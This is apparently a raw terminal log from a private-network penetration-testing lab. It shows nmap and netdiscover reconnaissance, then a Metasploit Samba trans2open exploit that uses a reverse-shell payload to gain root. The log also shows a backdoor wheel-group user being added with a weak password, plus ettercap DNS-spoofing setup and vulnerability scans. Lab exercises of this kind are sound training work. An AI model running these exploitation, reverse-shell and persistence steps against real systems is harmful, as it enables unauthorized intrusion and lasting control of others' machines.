@@ -1,0 +1,1555 @@
+HACK---1
+Currently scanning: Finished!   |   Screen View: Unique Hosts              
+                                                                            
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180            
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.168.2   08:00:27:4e:4f:23      1      60  PCS Systemtechnik GmbH   
+ 192.168.168.6   08:00:27:12:6e:ad      1      60  PCS Systemtechnik GmbH   
+ 192.168.168.19  0a:00:27:00:00:08      1      60  Unknown vendor           
+
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo nmap -sV -O --scripts=vuln 192.168.168.6 
+/usr/lib/nmap/nmap: unrecognized option '--scripts=vuln'
+See the output of nmap -h for a summary of options.
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo nmap -sV -O --script=vuln 192.168.168.6 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 17:29 IST
+
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo nmap 192.168.168.6
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 17:31 IST
+Nmap scan report for 192.168.168.6
+Host is up (0.0064s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+443/tcp  open  https
+1024/tcp open  kdm
+MAC Address: 08:00:27:12:6E:AD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo nmap -sV -O --script=vuln 192.168.168.6
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 17:31 IST
+
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo msfconsole                             
+Metasploit tip: Enable verbose logging with set VERBOSE true
+                                                  
+                                                                                                                                                                       
+                                   .,,.                  .                                                                                                             
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P                                                                                          
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p                                                                                        
+                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'                                                                                           
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P                                                                                           
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b                                                                                       
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b                                                                                          
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88                                                                                               
+                          .a#$$$$$$"`          88b  d8P  88b`?8888P'                                                                                                   
+                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:                                                                                          
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'                                                                                        
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'                                                                                         
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'                                                                                          
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'                                                                                           
+_______________________________________________________________   ,&$$$$$$'_____                                                                                       
+                                                                 ll&&$$$$'                                                                                             
+                                                              .;;lll&&&&'                                                                                              
+                                                            ...;;lllll&'                                                                                               
+                                                          ......;;;llll;;;....                                                                                         
+                                                           ` ......;;;;... .  .                                                                                        
+                                                                                                                                                                       
+
+       =[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,680 payloads     ]
++ -- --=[ 431 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search smb_version
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/smb/smb_version  .                normal  No     SMB Version Detection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
+
+msf > use 0
+msf auxiliary(scanner/smb/smb_version) > set RHOST 192.168.168.6
+RHOST => 192.168.168.6
+msf auxiliary(scanner/smb/smb_version) > run
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.168.6:139     -   Host could not be identified: Unix (Samba 2.2.1a)
+[*] 192.168.168.6         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_version) > exit
+                                                                                                                                                                       
+┌──(star㉿kali)-[~]
+└─$ searchsploit Samba 2.2.1a
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                       |  Path
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                         | osx/remote/9924.rb
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                    | multiple/remote/10.c
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                        | linux_x86/dos/36741.py
+------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                       
+┌──(star㉿kali)-[~]
+└─$ sudo msfconsole          
+Metasploit tip: Set the current module's RHOSTS with database values using 
+hosts -R or services -R
+                                                  
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search trans2open
+
+Matching Modules
+================
+
+   #  Name                                                         Disclosure Date  Rank   Check  Description
+   -  ----                                                         ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
+   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .
+
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open
+After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'
+
+msf > use 1
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf exploit(linux/samba/trans2open) > set payload payload/linux/x86/shell/reverse_tcp
+payload => linux/x86/shell/reverse_tcp
+msf exploit(linux/samba/trans2open) > set RHOSTS 192.168.168.6
+RHOSTS => 192.168.168.6
+msf exploit(linux/samba/trans2open) > set LHOST 192.168.168.26
+LHOST => 192.168.168.26
+msf exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.168.6    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (linux/x86/shell/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.168.26   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/trans2open) > run
+[*] Started reverse TCP handler on 192.168.168.26:4444 
+[*] 192.168.168.6:139 - Trying return address 0xbffffdfc...
+[*] 192.168.168.6:139 - Trying return address 0xbffffcfc...
+[*] 192.168.168.6:139 - Trying return address 0xbffffbfc...
+[*] 192.168.168.6:139 - Trying return address 0xbffffafc...
+[*] Sending stage (36 bytes) to 192.168.168.6
+[*] 192.168.168.6:139 - Trying return address 0xbffff9fc...
+[*] Sending stage (36 bytes) to 192.168.168.6
+[*] 192.168.168.6:139 - Trying return address 0xbffff8fc...
+[*] Sending stage (36 bytes) to 192.168.168.6
+[*] 192.168.168.6:139 - Trying return address 0xbffff7fc...
+[*] Sending stage (36 bytes) to 192.168.168.6
+[*] 192.168.168.6:139 - Trying return address 0xbffff6fc...
+[*] Command shell session 1 opened (192.168.168.26:4444 -> 192.168.168.6:1025) at 2025-12-23 17:37:04 +0530
+
+[*] Command shell session 2 opened (192.168.168.26:4444 -> 192.168.168.6:1026) at 2025-12-23 17:37:06 +0530
+[*] Command shell session 3 opened (192.168.168.26:4444 -> 192.168.168.6:1027) at 2025-12-23 17:37:07 +0530
+[*] Command shell session 4 opened (192.168.168.26:4444 -> 192.168.168.6:1028) at 2025-12-23 17:37:08 +0530
+^C
+Abort session 1? [y/N]  y
+
+[*] 192.168.168.6 - Command shell session 1 closed.  Reason: User exit
+msf exploit(linux/samba/trans2open) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  2         shell x86/linux               192.168.168.26:4444 -> 192.168.168.6:1026 (192.168.168.6)
+  3         shell x86/linux               192.168.168.26:4444 -> 192.168.168.6:1027 (192.168.168.6)
+  4         shell x86/linux               192.168.168.26:4444 -> 192.168.168.6:1028 (192.168.168.6)
+
+msf exploit(linux/samba/trans2open) > sessions -i 4
+[*] Starting interaction with 4...
+
+whoami
+root
+cd ..
+ls
+bin
+boot
+dev
+etc
+home
+initrd
+lib
+lost+found
+misc
+mnt
+opt
+proc
+root
+sbin
+tmp
+usr
+var
+/usr/sbin/useradd -G wheel tinku
+/usr/bin/passwd tinku
+New password: 123456
+BAD PASSWORD: it is too simplistic/systematic
+Retype new password: 123456
+Changing password for user tinku
+passwd: all authentication tokens updated successfully
+man
+
+[*] 192.168.168.6 - Command shell session 4 closed.  Reason: User exit
+msf exploit(linux/samba/trans2open) > history
+1   search smb_version
+2   use 0
+3   set RHOST 192.168.168.6
+4   run
+5   exit
+6   search trans2open
+7   use 1
+8   set payload payload/linux/x86/shell/reverse_tcp
+9   set RHOSTS 192.168.168.6
+10  set LHOST 192.168.168.26
+11  options
+12  run
+13  sessions
+14  sessions -i 4
+15  history
+msf exploit(linux/samba/trans2open) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf exploit(linux/samba/trans2open) > history
+1   search smb_version
+2   use 0
+3   set RHOST 192.168.168.6
+4   run
+5   exit
+6   search trans2open
+7   use 1
+8   set payload payload/linux/x86/shell/reverse_tcp
+9   set RHOSTS 192.168.168.6
+10  set LHOST 192.168.168.26
+11  options
+12  run
+13  sessions
+14  sessions -i 4
+15  history
+16  exit
+17  history
+msf exploit(linux/samba/trans2open) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf exploit(linux/samba/trans2open) > exit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf exploit(linux/samba/trans2open) > bye
+[-] Unknown command: bye. Run the help command for more details.
+msf exploit(linux/samba/trans2open) > quit
+[*] You have active sessions open, to exit anyway type "exit -y"
+msf exploit(linux/samba/trans2open) > exit -y
+                                                                                                                                                                       
+┌──(star㉿kali)-[~]
+└─$ history 
+    1  hostname
+    2  echo $USER
+    3  clear
+    4  pwd
+    5  clear
+    6  apt update
+    7  clear
+    8  sudo -s
+    9  ip a
+   10  sudo netdiscover -i 192.168.168.0/24
+   11  sudo netdiscover -r 192.168.168.0/24
+   12  ip a
+   13  sudo nmap -r 192.168.168.24
+   14  sudo nmap -sV -O --scripts=192.168.168.24
+   15  sudo nmap -sV -O --script=192.168.168.24
+   16  sudo nmap -sV -O --scripts=culners 192.168.168.24
+   17  sudo nmap -sV -O --scripts=vulners 192.168.168.24
+   18  sudo nmap -sV -O -sC 192.168.168.24
+   19  sudo nmap -sV -O --script=vuln 192.168.168.24
+   20  nikto -h http://192.168.168.24:3000
+   21  gobuster dir -u http://192.168.168.24:3000 -w /usr/share/wordlists/dirb/common.txt
+   22  clea
+   23  clear
+   24  poweroff
+   25  ip a
+   26  sudo nmap -r 192.168.168.2E
+   27  sudo nmap -r 192.168.168.25
+   28  sudo netdiscover -i 192.168.168.0/24
+   29  sudo netdiscover -r 192.168.168.0/24
+   30  sudo nmap -r 192.168.168.6
+   31  nmap -sV -sC 192.168.168.6
+   32  sudo nmap -sV -O --script=vuln 192.168.168.6
+   33  clear
+   34  sudo netdiscover -r 192.168.168.0/24
+   35  sudo nmap -sV -sC 192.168.168.6
+   36  sudo nmap -r 192.168.168.6
+   37  sudo nmap -sV -O --scripts=vuln 192.168.168.6
+   38  sudo nmap -sV -O --script=vuln 192.168.168.6
+   39  ip a
+   40  sudo nano /etc/network/interfaces
+   41  sudo systemctl restart networking
+   42  ip a
+   43  ip a
+   44  cler
+   45  clear
+   46  sudo netdiscover -r 192.168.168.0/24
+   47  sudo nmap -sV -O --scripts=vuln 192.168.168.6
+   48  sudo nmap -sV -O --script=vuln 192.168.168.6
+   49  sudo nmap 192.168.168.6
+   50  sudo nmap -sV -O --script=vuln 192.168.168.6
+   51  sudo msfconsole
+   52  searchsploit Samba 2.2.1a
+   53  sudo msfconsole
+
+
+
+victim----1
+
+┌──(star㉿kali)-[~]
+└─$ sudo ettercap -G                 
+[sudo] password for star: 
+
+ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team
+
+
+(ettercap:4688): GLib-WARNING **: 19:23:28.498: In call to g_spawn_sync(), wait status of a child process was requested but ECHILD was received by waitpid(). See the documentation of g_child_watch_source_new() for possible causes.
+^C
+
+User requested a CTRL+C... (deprecated, next time use proper shutdown)
+
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo nano /etc/ettercap/etter.dns 
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ python3 -m http.server 80   
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+127.0.0.1 - - [23/Dec/2025 19:37:34] code 404, message File not found
+127.0.0.1 - - [23/Dec/2025 19:37:34] "GET /dvwa HTTP/1.1" 404 -
+127.0.0.1 - - [23/Dec/2025 19:37:34] code 404, message File not found
+127.0.0.1 - - [23/Dec/2025 19:37:34] "GET /favicon.ico HTTP/1.1" 404 -
+^C
+Keyboard interrupt received, exiting.
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ git clone https://github.com/digininja/DVWA.git 
+Cloning into 'DVWA'...
+remote: Enumerating objects: 5622, done.
+remote: Total 5622 (delta 0), reused 0 (delta 0), pack-reused 5622 (from 1)
+Receiving objects: 100% (5622/5622), 2.64 MiB | 5.99 MiB/s, done.
+Resolving deltas: 100% (2809/2809), done.
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ ls
+Desktop    Downloads  Music     Public     Videos
+Documents  DVWA       Pictures  Templates
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ cd DVWA 
+                                                                             
+┌──(star㉿kali)-[~/DVWA]
+└─$ ls
+about.php     dvwa              phpinfo.php   README.ko.md  SECURITY.md
+CHANGELOG.md  external          php.ini       README.md     security.php
+compose.yml   favicon.ico       README.ar.md  README.pl.md  security.txt
+config        hackable          README.es.md  README.pt.md  setup.php
+COPYING.txt   index.php         README.fa.md  README.tr.md  tests
+database      instructions.php  README.fr.md  README.vi.md  vulnerabilities
+Dockerfile    login.php         README.id.md  README.zh.md
+docs          logout.php        README.it.md  robots.txt
+                                                                             
+┌──(star㉿kali)-[~/DVWA]
+└─$ cd dvwa 
+                                                                             
+┌──(star㉿kali)-[~/DVWA/dvwa]
+└─$ ls
+css  images  includes  js
+                                                                             
+┌──(star㉿kali)-[~/DVWA/dvwa]
+└─$ history 
+    1  hostname
+    2  echo $USER
+    3  clear
+    4  pwd
+    5  clear
+    6  apt update
+    7  clear
+    8  sudo -s
+    9  ip a
+   10  sudo netdiscover -i 192.168.168.0/24
+   11  sudo netdiscover -r 192.168.168.0/24
+   12  ip a
+   13  sudo nmap -r 192.168.168.24
+   14  sudo nmap -sV -O --scripts=192.168.168.24
+   15  sudo nmap -sV -O --script=192.168.168.24
+   16  sudo nmap -sV -O --scripts=culners 192.168.168.24
+   17  sudo nmap -sV -O --scripts=vulners 192.168.168.24
+   18  sudo nmap -sV -O -sC 192.168.168.24
+   19  sudo nmap -sV -O --script=vuln 192.168.168.24
+   20  nikto -h http://192.168.168.24:3000
+   21  gobuster dir -u http://192.168.168.24:3000 -w /usr/share/wordlists/dirb/common.txt
+   22  clea
+   23  clear
+   24  poweroff
+   25  ip a
+   26  sudo nmap -r 192.168.168.2E
+   27  sudo nmap -r 192.168.168.25
+   28  sudo netdiscover -i 192.168.168.0/24
+   29  sudo netdiscover -r 192.168.168.0/24
+   30  sudo nmap -r 192.168.168.6
+   31  nmap -sV -sC 192.168.168.6
+   32  sudo nmap -sV -O --script=vuln 192.168.168.6
+   33  clear
+   34  sudo netdiscover -r 192.168.168.0/24
+   35  sudo nmap -sV -sC 192.168.168.6
+   36  sudo nmap -r 192.168.168.6
+   37  sudo nmap -sV -O --scripts=vuln 192.168.168.6
+   38  sudo nmap -sV -O --script=vuln 192.168.168.6
+   39  ip a
+   40  sudo nano /etc/network/interfaces
+   41  sudo systemctl restart networking
+   42  ip a
+   43  ip a
+   44  clear
+   45  sudo ettercap -G
+   46  sudo nano /etc/ettercap/etter.dns
+   47  python3 -m http.server 80
+   48  git clone https://github.com/digininja/DVWA.git
+   49  ls
+   50  cd DVWA
+   51  ls
+   52  cd dvwa
+   53  ls
+┌──(star㉿kali)-[~]
+└─$ sudo ettercap -G                   
+[sudo] password for star: 
+
+ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team
+
+^C
+
+User requested a CTRL+C... (deprecated, next time use proper shutdown)
+
+^C
+                                                                             
+┌──(star㉿kali)-[~]
+└─$ history                            
+    1  hostname
+    2  echo $USER
+    3  clear
+    4  pwd
+    5  clear
+    6  apt update
+    7  clear
+    8  sudo -s
+    9  ip a
+   10  sudo netdiscover -i 192.168.168.0/24
+   11  sudo netdiscover -r 192.168.168.0/24
+   12  ip a
+   13  sudo nmap -r 192.168.168.24
+   14  sudo nmap -sV -O --scripts=192.168.168.24
+   15  sudo nmap -sV -O --script=192.168.168.24
+   16  sudo nmap -sV -O --scripts=culners 192.168.168.24
+   17  sudo nmap -sV -O --scripts=vulners 192.168.168.24
+   18  sudo nmap -sV -O -sC 192.168.168.24
+   19  sudo nmap -sV -O --script=vuln 192.168.168.24
+   20  nikto -h http://192.168.168.24:3000
+   21  gobuster dir -u http://192.168.168.24:3000 -w /usr/share/wordlists/dirb/common.txt
+   22  clea
+   23  clear
+   24  poweroff
+   25  ip a
+   26  sudo nmap -r 192.168.168.2E
+   27  sudo nmap -r 192.168.168.25
+   28  sudo netdiscover -i 192.168.168.0/24
+   29  sudo netdiscover -r 192.168.168.0/24
+   30  sudo nmap -r 192.168.168.6
+   31  nmap -sV -sC 192.168.168.6
+   32  sudo nmap -sV -O --script=vuln 192.168.168.6
+   33  clear
+   34  sudo netdiscover -r 192.168.168.0/24
+   35  sudo nmap -sV -sC 192.168.168.6
+   36  sudo nmap -r 192.168.168.6
+   37  sudo nmap -sV -O --scripts=vuln 192.168.168.6
+   38  sudo nmap -sV -O --script=vuln 192.168.168.6
+   39  ip a
+   40  sudo nano /etc/network/interfaces
+   41  sudo systemctl restart networking
+   42  ip a
+   43  ip a
+   44  sudo netdiscover -r 192.168.168.0/24
+   45  sudo nmap 192.168.168.0/24
+   46  sudo nmap -sV -O --script=vuln 192.168.168.27
+   47  sudo nmap -sV -sV -O 192.168.168.27
+   48  sudo nmap -sV -sS -O 192.168.168.27
+   49  searchsploit httpd 2.0
+   50  sudo msfconsole
+   51  searchsploit httpd 2.0
+   52  sudo msfconsole
+   53  sudo netdiscover
+   54  sudo netdiscover -r 192.168.168.0/24
+   55  sudo nmap -sV -sS -O 192.168.168.27
+   56  sudo nmap -sV -sS -O 192.168.168.19
+   57  sudo msfconsole
+   58  searchsploit httpd 2.0
+   59  sudo msfconsole
+   60  searchsploit HTTPD 2.0.19
+   61  sudo msfconsole
+   62  sudo nmap -sV -sS -O 192.168.168.27
+   63  sudo nmap -sV -sS -O --script=vulners 192.168.168.27
+   64  ping 8.8.8.8
+   65  ftp 192.168.168.27
+   66  sudo nmap -sV -O --script=vuln 192.168.168.28
+   67  sudo nmap -sV -sS -O 192.168.168.28
+   68  sudo ettercap -G
+┌──(star㉿kali)-[~]
+└─$ history                                                                  
+    1  hostname
+    2  echo $USER
+    3  clear
+    4  pwd
+    5  clear
+    6  apt update
+    7  clear
+    8  sudo -s
+    9  ip a
+   10  sudo netdiscover -i 192.168.168.0/24
+   11  sudo netdiscover -r 192.168.168.0/24
+   12  ip a
+   13  sudo nmap -r 192.168.168.24
+   14  sudo nmap -sV -O --scripts=192.168.168.24
+   15  sudo nmap -sV -O --script=192.168.168.24
+   16  sudo nmap -sV -O --scripts=culners 192.168.168.24
+   17  sudo nmap -sV -O --scripts=vulners 192.168.168.24
+   18  sudo nmap -sV -O -sC 192.168.168.24
+   19  sudo nmap -sV -O --script=vuln 192.168.168.24
+   20  nikto -h http://192.168.168.24:3000
+   21  gobuster dir -u http://192.168.168.24:3000 -w /usr/share/wordlists/dirb/common.txt
+   22  clea
+   23  clear
+   24  poweroff
+   25  ip a
+   26  sudo nmap -r 192.168.168.2E
+   27  sudo nmap -r 192.168.168.25
+   28  sudo netdiscover -i 192.168.168.0/24
+   29  sudo netdiscover -r 192.168.168.0/24
+   30  sudo nmap -r 192.168.168.6
+   31  nmap -sV -sC 192.168.168.6
+   32  sudo nmap -sV -O --script=vuln 192.168.168.6
+   33  clear
+   34  sudo netdiscover -r 192.168.168.0/24
+   35  sudo nmap -sV -sC 192.168.168.6
+   36  sudo nmap -r 192.168.168.6
+   37  sudo nmap -sV -O --scripts=vuln 192.168.168.6
+   38  sudo nmap -sV -O --script=vuln 192.168.168.6
+   39  ip a
+   40  sudo nano /etc/network/interfaces
+   41  sudo systemctl restart networking
+   42  ip a
+   43  ip a
+   44  sudo netdiscover -r 192.168.168.0/24
+   45  sudo nmap 192.168.168.0/24
+   46  sudo nmap -sV -O --script=vuln 192.168.168.27
+   47  sudo nmap -sV -sV -O 192.168.168.27
+   48  sudo nmap -sV -sS -O 192.168.168.27
+   49  searchsploit httpd 2.0
+   50  sudo msfconsole
+   51  searchsploit httpd 2.0
+   52  sudo msfconsole
+   53  sudo netdiscover
+   54  sudo netdiscover -r 192.168.168.0/24
+   55  sudo nmap -sV -sS -O 192.168.168.27
+   56  sudo nmap -sV -sS -O 192.168.168.19
+   57  sudo msfconsole
+   58  searchsploit httpd 2.0
+   59  sudo msfconsole
+   60  searchsploit HTTPD 2.0.19
+   61  sudo msfconsole
+   62  sudo nmap -sV -sS -O 192.168.168.27
+   63  sudo nmap -sV -sS -O --script=vulners 192.168.168.27
+   64  ping 8.8.8.8
+   65  ftp 192.168.168.27
+   66  sudo nmap -sV -O --script=vuln 192.168.168.28
+   67  sudo nmap -sV -sS -O 192.168.168.28
+   68  ip a
+   69  history
+
+
+
+Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts                                                                                        
+                                                                                                                                                            
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                            
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.56.1    0a:00:27:00:00:07      1      60  Unknown vendor                                                                                           
+ 192.168.56.100  08:00:27:33:da:92      1      60  PCS Systemtechnik GmbH                                                                                   
+ 192.168.56.117  08:00:27:db:3f:7a      1      60  PCS Systemtechnik GmbH                                                                                   
+
+                                                                                                                                                             
+┌──(star㉿kali)-[~]
+└─$ sudo nmap -sV -O --script=vulners 192.168.56.117/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-24 00:18 IST
+Nmap scan report for 192.168.56.1
+Host is up (0.00035s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT     STATE SERVICE         VERSION
+21/tcp   open  tcpwrapped
+80/tcp   open  http            Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc           Microsoft Windows RPC
+139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+902/tcp  open  ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)
+912/tcp  open  vmware-auth     VMware Authentication Daemon 1.0 (Uses VNC, SOAP)
+3306/tcp open  mysql           MySQL (unauthorized)
+5357/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+MAC Address: 0A:00:27:00:00:07 (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=12/24%OT=80%CT=1%CU=39454%PV=Y%DS=1%DC=D%G=Y%M=0A0027%
+OS:TM=694AE410%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=102%TI=I%CI=I%II=
+OS:I%SS=S%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=107
+OS:%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FD%GCD=2%ISR=FF%TI=I%CI=I
+OS:%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=
+OS:M5B4NW8ST11%O2=M5B4NW8ST11%O3=M5B4NW8NNT11%O4=M5B4NW8ST11%O5=M5B4NW8ST11
+OS:%O6=M5B4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y
+OS:%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD
+OS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%
+OS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD
+OS:=Z)
+
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Nmap scan report for 192.168.56.100
+Host is up (0.00041s latency).
+All 1000 scanned ports on 192.168.56.100 are in ignored states.
+Not shown: 1000 closed tcp ports (reset)
+MAC Address: 08:00:27:33:DA:92 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: 2N Helios IP VoIP doorbell (96%), Advanced Illumination DCS-100E lighting controller (96%), AudioControl D3400 network amplifier (96%), British Gas GS-Z3 data logger (96%), Chamberlain myQ garage door opener (96%), Daikin DKN Cloud Wi-Fi Adaptor (96%), Daysequerra M4.2SI radio (96%), Denver Electronics AC-5000W MK2 camera (96%), Eve Cam (lwIP 2.1.0 - 2.2.0) (96%), Fatek FBs-CBEH PLC Ethernet communication board (96%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+Nmap scan report for 192.168.56.117
+Host is up (0.00075s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT     STATE SERVICE      VERSION
+21/tcp   open  ftp          Microsoft ftpd
+53/tcp   open  domain       Simple DNS Plus
+80/tcp   open  http         HttpFileServer httpd 2.3
+|_http-server-header: HFS 2.3
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
+|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.54: 
+|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
+|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
